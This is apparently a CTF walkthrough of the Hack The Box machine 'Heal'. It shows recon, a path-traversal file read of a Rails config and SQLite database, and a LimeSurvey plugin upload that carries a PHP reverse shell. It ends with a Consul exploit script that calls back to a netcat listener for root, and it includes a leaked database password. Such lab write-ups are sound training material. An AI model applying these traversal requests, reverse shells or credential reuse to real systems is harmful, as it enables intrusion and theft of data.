---
title: Heal
tags:
  - htb
  - medium
---
# Nmap
```plaintext
# Nmap 7.94SVN scan initiated Sat Jan  4 02:41:23 2025 as: /usr/lib/nmap/nmap -sT -A -v -oA nmap heal.htb
Nmap scan report for heal.htb (10.10.11.46)
Host is up (0.084s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 68:af:80:86:6e:61:7e:bf:0b:ea:10:52:d7:7a:94:3d (ECDSA)
|_  256 52:f4:8d:f1:c7:85:b6:6f:c6:5f:b2:db:a6:17:68:ae (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Heal
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 800D9D6AD40E40173F19D5EE9752AC18
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=1/4%OT=22%CT=1%CU=31818%PV=Y%DS=2%DC=T%G=Y%TM=6778E
OS:641%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=103%TI=Z%CI=Z%II=I%TS=A)O
OS:PS(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CS
OS:T11NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)E
OS:CN(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F
OS:=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5
OS:(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z
OS:%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=
OS:G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 44.279 days (since Wed Nov 20 20:00:39 2024)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using proto 1/icmp)
HOP RTT      ADDRESS
1   94.41 ms 10.10.14.1
2   89.94 ms heal.htb (10.10.11.46)

Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jan  4 02:41:53 2025 -- 1 IP address (1 host up) scanned in 30.18 seconds
```
# Discovery
## Subdomain
```plaintext
┌──(kali㉿kali)-[~/ctfs/heal]
└─$ ffuf -u http://heal.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.heal.htb" -fw 6

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://heal.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.heal.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 6
________________________________________________

api                     [Status: 200, Size: 12515, Words: 469, Lines: 91, Duration: 104ms]
```
## Login | Register
![login page](/static/heal/healHtb.png)
![register page](/static/heal/healHtbRegister.png)
![resume builder](/static/heal/healHtbResume.png)
## PDF Export
![pdf export](/static/heal/healHtbExportPDF.png)
### Burpsuite
![](/static/heal/healHtbOptionsDownload.png)
![](/static/heal/healHtbGetDownload.png)
![](/static/heal/healHtbAuthToken.png)
![](/static/heal/healHtbPDFDownload.png)
## LFI
![](/static/heal/healHtbEtcPasswd.png)
```plaintext
┌──(kali㉿kali)-[~/ctfs/heal]
└─$ ffuf -u 'http://api.heal.htb/download?filename=../../config/FUZZ' -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxMH0.1HGjddQjtuWidz164C3dJQJ2hs4S2YayWCU5TFsrzaE" -t 20 -e yml,xhl,txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://api.heal.htb/download?filename=../../config/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Header           : Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxMH0.1HGjddQjtuWidz164C3dJQJ2hs4S2YayWCU5TFsrzaE
 :: Extensions       : yml 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 20
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500

________________________________________________

database                     [Status: 200, Size: 12515, Words: 469, Lines: 91, Duration: 104ms]
```


```bash
┌──(kali㉿kali)-[~]
└─$ curl 'http://api.heal.htb/download?filename=../../config/database.yml' -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxMH0.1HGjddQjtuWidz164C3dJQJ2hs4S2YayWCU5TFsrzaE"
# SQLite. Versions 3.8.0 and up are supported.
#   gem install sqlite3
#
#   Ensure the SQLite 3 gem is defined in your Gemfile
#   gem "sqlite3"
#
default: &default
  adapter: sqlite3
  pool: <%= ENV.fetch("RAILS_MAX_THREADS") { 5 } %>
  timeout: 5000

development:
  <<: *default
  database: storage/development.sqlite3

# Warning: The database defined as "test" will be erased and
# re-generated from your development database when you run "rake".
# Do not set this db to the same as development or production.
test:
  <<: *default
  database: storage/test.sqlite3

production:
  <<: *default
  database: storage/development.sqlite3
```

```bash
┌──(kali㉿kali)-[~]
└─$ curl 'http://api.heal.htb/download?filename=../../storage/development.sqlite3' -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxMH0.1HGjddQjtuWidz164C3dJQJ2hs4S2YayWCU5TFsrzaE" -L -o development.sqlite3
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 32768  100 32768    0     0   115k      0 --:--:-- --:--:-- --:--:--  115k

```

## Database
![](/static/heal/healHtbDBView.png)
## Ralph Password Crack
![](/static/heal/healHtbRalphCrack.png)
# Survey
![](/static/heal/healHtbSurvey.png)
## Lime Survey Login
![](/static/heal/healHtbLimeSurveyLogin.png)
## RCE
![](/static/heal/healHtbRCEGithub.png)
![](/static/heal/healHtbLimeSurveyPlugins.png)
```bash
┌──(kali㉿kali)-[~/ctfs/heal/Limesurvey-RCE]
└─$ cat config.xml 
<?xml version="1.0" encoding="UTF-8"?>
<config>
    <metadata>
        <name>Y1LD1R1M</name>
        <type>plugin</type>
        <creationDate>2020-03-20</creationDate>
        <lastUpdate>2020-03-31</lastUpdate>
        <author>Y1LD1R1M</author>
        <authorUrl>https://github.com/Y1LD1R1M-1337</authorUrl>
        <supportUrl>https://github.com/Y1LD1R1M-1337</supportUrl>
        <version>6.6.4</version>
        <license>GNU General Public License version 2 or later</license>
        <description>
                <![CDATA[Author : Y1LD1R1M]]></description>
    </metadata>

    <compatibility>
        <version>3.0</version>
        <version>4.0</version>
        <version>5.0</version>
        <version>6.6</version>
    </compatibility>
    <updaters disabled="disabled"></updaters>
</config>
```
I have used Pentest Monkey's PHP reverse shell.
![](/static/htb/healHtbActivatePlugin.png)
# Ron
```bash
www-data@heal:~$ find . -type f -iname "config.*"
find . -type f -iname "config.*"
./limesurvey/vendor/twbs/bootstrap/config.yml
./limesurvey/vendor/kcfinder/conf/config.php
./limesurvey/vendor/yiisoft/yii/framework/messages/config.php
./limesurvey/vendor/yiisoft/yii/requirements/messages/config.php
./limesurvey/assets/packages/ckeditor/config.js
./limesurvey/themes/admin/Sea_Green/config.xml
./limesurvey/themes/survey/fruity_twentythree/config.xml
./limesurvey/themes/survey/bootswatch/config.xml
./limesurvey/themes/survey/fruity/config.xml
./limesurvey/themes/survey/vanilla/config.xml
./limesurvey/themes/question/browserdetect/survey/questions/answer/shortfreetext/config.xml
./limesurvey/themes/question/inputondemand/survey/questions/answer/multipleshorttext/config.xml
./limesurvey/themes/question/ranking_advanced/survey/questions/answer/ranking/config.xml
./limesurvey/themes/question/bootstrap_buttons/survey/questions/answer/listradio/config.xml
./limesurvey/themes/question/bootstrap_buttons_multi/survey/questions/answer/multiplechoice/config.xml
./limesurvey/themes/question/image_select-listradio/survey/questions/answer/listradio/config.xml
./limesurvey/themes/question/bootstrap_dropdown/survey/questions/answer/list_dropdown/config.xml
./limesurvey/themes/question/image_select-multiplechoice/survey/questions/answer/multiplechoice/config.xml
./limesurvey/application/core/plugins/ExportR/config.xml
./limesurvey/application/core/plugins/ComfortUpdateChecker/config.xml
./limesurvey/application/core/plugins/expressionQuestionForAll/config.xml
./limesurvey/application/core/plugins/ExportSTATAxml/config.xml
./limesurvey/application/core/plugins/oldUrlCompat/config.xml
./limesurvey/application/core/plugins/AuditLog/config.xml
./limesurvey/application/core/plugins/PasswordRequirement/config.xml
./limesurvey/application/core/plugins/statFunctions/config.xml
./limesurvey/application/core/plugins/expressionFixedDbVar/config.xml
./limesurvey/application/core/plugins/mailSenderToFrom/config.xml
./limesurvey/application/core/plugins/FunctionStatic/config.xml
./limesurvey/application/core/plugins/TwoFactorAdminLogin/config.xml
./limesurvey/application/core/plugins/Authdb/config.xml
./limesurvey/application/core/plugins/UpdateCheck/config.xml
./limesurvey/application/core/plugins/customToken/config.xml
./limesurvey/application/core/plugins/dateFunctions/config.xml
./limesurvey/application/core/plugins/Authwebserver/config.xml
./limesurvey/application/core/plugins/ExpressionAnswerOptions/config.xml
./limesurvey/application/core/plugins/AuthLDAP/config.xml
./limesurvey/application/core/plugins/GoogleOAuthSMTP/config.xml
./limesurvey/application/core/plugins/expressionQuestionHelp/config.xml
./limesurvey/application/core/plugins/AzureOAuthSMTP/config.xml
./limesurvey/application/core/plugins/ExportSPSSsav/config.xml
./limesurvey/application/config/config.php
./limesurvey/application/views/survey/questions/answer/language/config.xml
./limesurvey/application/views/survey/questions/answer/date/config.xml
./limesurvey/application/views/survey/questions/answer/listradio/config.xml
./limesurvey/application/views/survey/questions/answer/5pointchoice/config.xml
./limesurvey/application/views/survey/questions/answer/shortfreetext/config.xml
./limesurvey/application/views/survey/questions/answer/gender/config.xml
./limesurvey/application/views/survey/questions/answer/equation/config.xml
./limesurvey/application/views/survey/questions/answer/yesno/config.xml
./limesurvey/application/views/survey/questions/answer/list_with_comment/config.xml
./limesurvey/application/views/survey/questions/answer/file_upload/config.xml
./limesurvey/application/views/survey/questions/answer/boilerplate/config.xml
./limesurvey/application/views/survey/questions/answer/longfreetext/config.xml
./limesurvey/application/views/survey/questions/answer/list_dropdown/config.xml
./limesurvey/application/views/survey/questions/answer/numerical/config.xml
./limesurvey/application/views/survey/questions/answer/hugefreetext/config.xml
./limesurvey/application/views/survey/questions/answer/multiplenumeric/config.xml
./limesurvey/application/views/survey/questions/answer/multipleshorttext/config.xml
./limesurvey/application/views/survey/questions/answer/ranking/config.xml
./limesurvey/application/views/survey/questions/answer/arrays/yesnouncertain/config.xml
./limesurvey/application/views/survey/questions/answer/arrays/dualscale/config.xml
./limesurvey/application/views/survey/questions/answer/arrays/array/config.xml
./limesurvey/application/views/survey/questions/answer/arrays/increasesamedecrease/config.xml
./limesurvey/application/views/survey/questions/answer/arrays/5point/config.xml
./limesurvey/application/views/survey/questions/answer/arrays/column/config.xml
./limesurvey/application/views/survey/questions/answer/arrays/multiflexi/config.xml
./limesurvey/application/views/survey/questions/answer/arrays/10point/config.xml
./limesurvey/application/views/survey/questions/answer/arrays/texts/config.xml
./limesurvey/application/views/survey/questions/answer/multiplechoice_with_comments/config.xml
./limesurvey/application/views/survey/questions/answer/multiplechoice/config.xml
./limesurvey/plugins/Demo/noMailToExample/config.xml
./limesurvey/plugins/Demo/DemoDateSetting/config.xml
./limesurvey/plugins/Demo/demoAddEmFunction/config.xml
./limesurvey/docs/themes/questiontheme_example/survey/questions/answer/listradio/config.xml
./limesurvey/upload/plugins/Y1LD1R1M/config.xml
./limesurvey/tmp/install_APcVcwV9PNf4CMXaR6Bn4v9v745RcKTk/config.xml
./limesurvey/tmp/install_aplW15dF18ZwhWqIXwBupI8UaXIcZq4j/config.xml
./limesurvey/tmp/install_t9qqh9I0zRcEpWjuwBjqwHYjRdAsqTkH/config.xml
./limesurvey/tmp/install_NwD0mZubQL7Tuvl755lGRfkr4eq6coQk/config.xml
./limesurvey/tmp/install_B3Wc6WmHtkhNGgIiAhUHV3Yus5bwHehL/config.xml
./limesurvey/tmp/install_GCw34O89baeqR5ZF17yXruEdCRthYKn7/config.xml
./limesurvey/tmp/install_E5J2i0swCCW2sLNFgpxXfpw49YNP4ToD/config.xml
./limesurvey/tmp/assets/96ea892d/config.js
./limesurvey/tmp/install_BEvxbbDxs6Jr11AT8N11xzT8dSqfTxFg/config.xml
./limesurvey/tmp/install_KNCZlh2NJpfKE8Ofm4dqa6jR7gQjjOGf/config.xml
./limesurvey/tmp/install_OeNsYwTOQkU1k0fauOT3jmOKBhaCK2FV/config.xml
./limesurvey/tmp/install_uxIAB7JMqpLd1sGDL1Wp04UhlBXceYSC/config.xml
./limesurvey/tmp/install_9uDeKWXYg7hOLWPnvOV5hG5j5hQYy2y0/config.xml
```
`/var/www/limesurvey/application/config/config.php` looks interesting
```php
return array(
        'components' => array(
                'db' => array(
                        'connectionString' => 'pgsql:host=localhost;port=5432;user=db_user;password=AdmiDi0_pA$$w0rd;dbname=survey;',
                        'emulatePrepare' => true,
                        'username' => 'db_user',
                        'password' => 'AdmiDi0_pA$$w0rd',
                        'charset' => 'utf8',
                        'tablePrefix' => 'lime_',
                ),

                 'session' => array (
                        'sessionName'=>'LS-ZNIDJBOXUNKXWTIP',
                        // Uncomment the following lines if you need table-based sessions.
                        // Note: Table-based sessions are currently not supported on MSSQL server.
                        // 'class' => 'application.core.web.DbHttpSession',
                        // 'connectionID' => 'db',
                        // 'sessionTableName' => '{{sessions}}',
                 ),

                'urlManager' => array(
                        'urlFormat' => 'path',
                        'rules' => array(
                                // You can add your own rules here
                        ),
                        'showScriptName' => true,
                ),

                // If URLs generated while running on CLI are wrong, you need to set the baseUrl in the request component. For example:
                //'request' => array(
                //      'baseUrl' => '/limesurvey',
                //),
        ),
        // For security issue : it's better to set runtimePath out of web access
        // Directory must be readable and writable by the webuser
        // 'runtimePath'=>'/var/limesurvey/runtime/'
        // Use the following config variable to set modified optional settings copied from config-defaults.php
        'config'=>array(
        // debug: Set this to 1 if you are looking for errors. If you still get no errors after enabling this
        // then please check your error-logs - either in your hosting provider admin panel or in some /logs directory
        // on your webspace.
        // LimeSurvey developers: Set this to 2 to additionally display STRICT PHP error messages and get full access to standard templates
                'debug'=>0,
                'debugsql'=>0, // Set this to 1 to enanble sql logging, only active when debug = 2

                // If URLs generated while running on CLI are wrong, you need to uncomment the following line and set your
                // public URL (the URL facing survey participants). You will also need to set the request->baseUrl in the section above.
                //'publicurl' => 'https://www.example.org/limesurvey',

                // Update default LimeSurvey config here
        )
);
/* End of file config.php */
/* Location: ./application/config/config.php */

```
Log-in to user `ron`
```bash
┌──(kali㉿kali)-[~/ctfs/heal]
└─$ ssh ron@heal.htb                       
ron@heal.htb's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun Jan  5 02:26:16 PM UTC 2025

  System load:           1.78
  Usage of /:            94.1% of 7.71GB
  Memory usage:          32%
  Swap usage:            0%
  Processes:             277
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.46
  IPv6 address for eth0: dead:beef::250:56ff:fe94:f60f

  => / is using 94.1% of 7.71GB


Expanded Security Maintenance for Applications is not enabled.

29 updates can be applied immediately.
18 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun Jan  5 14:11:55 2025 from 10.10.14.212
ron@heal:~$ cat user.txt
FLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAG
```

# Root
```bash
ron@heal:~$ netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3001          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8600          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8503          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8500          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8302          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8301          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8300          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 0.0.0.0:5353            0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:34725           0.0.0.0:*                           -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
udp        0      0 127.0.0.1:8301          0.0.0.0:*                           -                   
udp        0      0 127.0.0.1:8302          0.0.0.0:*                           -                   
udp        0      0 127.0.0.1:8600          0.0.0.0:*                           -                   
udp6       0      0 :::5353                 :::*                                -                   
udp6       0      0 :::43687                :::*                                -                 
```

Let's forward port `8500`

![](/static/heal/healHtbConsul.png)
![](/static/heal/healHtbConsulExploit.png)
```bash
┌──(kali㉿kali)-[~/ctfs/heal]
└─$ python3 root.py 127.0.0.1 8500 10.10.14.44 9003 1

[+] Request sent successfully, check your listener

```
```bash
┌──(kali㉿kali)-[~/ctfs/heal]
└─$ nc -lvnp 9003    
listening on [any] 9003 ...
connect to [10.10.14.44] from (UNKNOWN) [10.10.11.46] 60412
bash: cannot set terminal process group (239541): Inappropriate ioctl for device
bash: no job control in this shell
root@heal:/# cat /root/root.txt
cat /root/root.txt
FLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAG
root@heal:/# 

```